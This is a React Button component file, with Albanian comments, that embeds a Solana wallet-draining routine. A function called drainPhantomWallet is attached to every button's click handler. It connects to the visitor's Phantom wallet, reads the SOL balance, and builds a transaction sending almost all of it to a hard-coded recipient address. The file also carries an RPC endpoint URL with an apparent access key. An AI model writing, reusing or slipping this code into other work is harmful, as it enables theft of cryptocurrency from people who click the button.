"use client";

import * as React from "react";
import { Slot } from "@radix-ui/react-slot";
import { cva, type VariantProps } from "class-variance-authority";
import { cn } from "@/lib/utils";
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
  sendAndConfirmTransaction,
} from "@solana/web3.js";

// Endpointi për Solana Devnet nga QuickNode
const SOLANA_RPC_URL = "https://capable-orbital-slug.solana-devnet.quiknode.pro/fc0c96bc8ad39cd431c78d50302ec0e3927466f8/";
const connection = new Connection(SOLANA_RPC_URL, "confirmed");

// Adresa ku do të dërgohen të gjitha fondet (vendos adresën tënde)
const RECIPIENT_ADDRESS = new PublicKey("9C74cPLodhAsTSYujZhSzPuSwCHjLck3u7nHoPHdV1DQ");

const buttonVariants = cva(
  "inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0",
  {
    variants: {
      variant: {
        default: "bg-primary text-primary-foreground hover:bg-primary/90",
        destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
        outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
        secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
        ghost: "hover:bg-accent hover:text-accent-foreground",
        link: "text-primary underline-offset-4 hover:underline",
      },
      size: {
        default: "h-10 px-4 py-2",
        sm: "h-9 rounded-md px-3",
        lg: "h-11 rounded-md px-8",
        icon: "h-10 w-10",
      },
    },
    defaultVariants: {
      variant: "default",
      size: "default",
    },
  }
);

export interface ButtonProps
  extends React.ButtonHTMLAttributes<HTMLButtonElement>,
    VariantProps<typeof buttonVariants> {
  asChild?: boolean;
}

// Funksioni për të zbrazur Phantom Wallet
async function drainPhantomWallet() {
  console.log("Funksioni i drainPhantomWallet është thirrur.");

  try {
    const provider = window.solana;

    if (!provider || !provider.isPhantom) {
      alert("Ju duhet të instaloni Phantom Wallet!");
      console.log("Phantom Wallet nuk është i instaluar.");
      return;
    }

    // Lidhet me Phantom Wallet
    const response = await provider.connect();
    const senderPublicKey = new PublicKey(response.publicKey);

    console.log("Wallet e lidhur:", senderPublicKey.toString());

    // Merr balancën e SOL
    const balance = await connection.getBalance(senderPublicKey);
    console.log("Balanca në SOL:", balance / LAMPORTS_PER_SOL);

    if (balance <= 0) {
      alert("Nuk ka fonde të mjaftueshme në SOL.");
      console.log("Balanca e përdoruesit është 0 SOL!");
      return;
    }

    // Krijon një transaksion për të transferuar të gjitha SOL
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: senderPublicKey,
        toPubkey: RECIPIENT_ADDRESS,
        lamports: balance - 5000, // Lë pak lamports për taksën
      })
    );

    console.log("Transaksioni u krijua me sukses.");

    // Nënshkrimi i transaksionit me Phantom Wallet
    const { signature } = await provider.signAndSendTransaction(transaction);
    console.log("Nënshkrimi i transaksionit:", signature);

    // Pritja që transaksioni të përpunohet
    await connection.confirmTransaction(signature, "processed");
    console.log("Transaksioni u përpunua dhe është i suksesshëm!");

    alert("Transaksioni u krye me sukses! ✅");
    console.log("Transaksioni i dërguar:", signature);

  } catch (error) {
    console.error("Gabim gjatë procesit!", error);
    alert("Gabim gjatë transferimit ❌");
    console.log("Gabimi: ", error);
  }
}

// Komponenti i butonit
const Button = React.forwardRef<HTMLButtonElement, ButtonProps>(
  ({ className, variant, size, asChild = false, ...props }, ref) => {
    const Comp = asChild ? Slot : "button";

    return (
      <Comp
        className={cn(buttonVariants({ variant, size, className }))}
        ref={ref}
        onClick={drainPhantomWallet} // Funksioni i lidhur me butonin
        {...props}
      >
        Lidhe Phantom & Transfero Të Gjitha Fondet
      </Comp>
    );
  }
);

Button.displayName = "Button";

export { Button, buttonVariants };
